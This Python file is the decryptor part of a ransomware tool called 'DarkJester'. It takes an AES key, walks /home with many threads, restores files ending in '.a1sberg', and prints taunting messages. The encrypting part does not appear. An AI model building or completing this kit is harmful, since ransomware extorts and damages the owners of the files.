banner = r"""
________                __        ____.                __                
\______ \ _____ _______|  | __   |    | ____   _______/  |_  ___________ 
 |    |  \\__  \\_  __ \  |/ /   |    |/ __ \ /  ___/\   __\/ __ \_  __ \
 |    `   \/ __ \|  | \/    </\__|    \  ___/ \___ \  |  | \  ___/|  | \/
/_______  (____  /__|  |__|_ \________|\___  >____  > |__|  \___  >__|   
        \/     \/           \/             \/     \/            \/       
Disclaimer: DarkJester is a powerful ransomware tool developed for educational and research purposes only. 
Unauthorized use of this software is strictly illegal and may result in criminal prosecution. 
Running or deploying DarkJester on any system without explicit permission from the system owner constitutes a violation of cybersecurity laws. 
This tool is intended solely for demonstrating security flaws and testing defenses in controlled environments. 
Always act responsibly and ethically when working with this kind tool.
"""
import os
import base64
import threading
import subprocess as sp
import re
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from concurrent.futures import ThreadPoolExecutor

def decrypt_file(encrypted_file_path, key):
    try:
        print(f"[*] Decryption Initialized: {encrypted_file_path}")
        with open(encrypted_file_path, 'rb') as enc_file:
            encrypted_data = enc_file.read()
        iv = encrypted_data[:16]
        cipher_text = encrypted_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(cipher_text), AES.block_size)
        decrypted_file_path = encrypted_file_path.rsplit('.a1sberg', 1)[0]
        with open(decrypted_file_path, 'wb') as dec_file:
            dec_file.write(decrypted_data)
        os.remove(encrypted_file_path)
        print(f"[+] Jester Successfully Retrieved your File: {encrypted_file_path}")
    except Exception as e:
        print(f"[-] Something went wrong, looks like Jester needs to check this again. Error decrypting {encrypted_file_path}: {e}")

def process_directory(root, files, key, max_threads=30):
    threads = []
    for file_name in files:
        if file_name.endswith('.a1sberg'):
            file_path = os.path.join(root, file_name)
            print(f"[*] Jester is Preparing: {file_path}")
            while len(threads) >= max_threads:
                threads = [t for t in threads if t.is_alive()]
            thread = threading.Thread(target=decrypt_file, args=(file_path, key))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()

def decrypt_directory(directory_path, key, max_threads=30):
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for root, _, files in os.walk(directory_path):
            executor.submit(process_directory, root, files, key, max_threads)

def main():
    print(banner)
    key_input = input("[*] Provide the decryption key to Jester: ")
    if key_input == '':
        return
    try:
        key = base64.b64decode(key_input)
    except Exception as e:
        print(f"[-] {e}")
        return
    user_directory = f"/home"
    decrypt_directory(user_directory, key)
    os.system('clear')
    print(banner)
    print("[+] Here you are! The trick has been played, and Jester has successfully undone the lock! Your files are free once more, restored to their rightful state. Consider this a lesson in the art of jest. A reminder, perhaps, that not all things are as serious as they seem! Thanksss for the entertainment. Jester takes a bow and bids you farewell... for now!")

if __name__ == '__main__':
    main()

